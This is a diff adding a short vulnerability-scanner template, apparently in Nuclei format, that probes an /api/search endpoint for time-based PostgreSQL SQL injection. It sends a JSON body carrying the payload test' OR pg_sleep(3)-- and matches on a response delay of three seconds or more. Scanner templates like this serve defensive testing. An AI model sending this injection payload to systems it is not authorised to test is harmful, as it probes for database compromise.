@@ -1,0 +1,16 @@
+id: sql-injection-time-based
+info:
+  name: SQL Injection Time Based
+  author: project-c
+  severity: high
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/search"
+    body: '{"q":"test'' OR pg_sleep(3)--"}'
+    headers:
+      Content-Type: application/json
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=3"
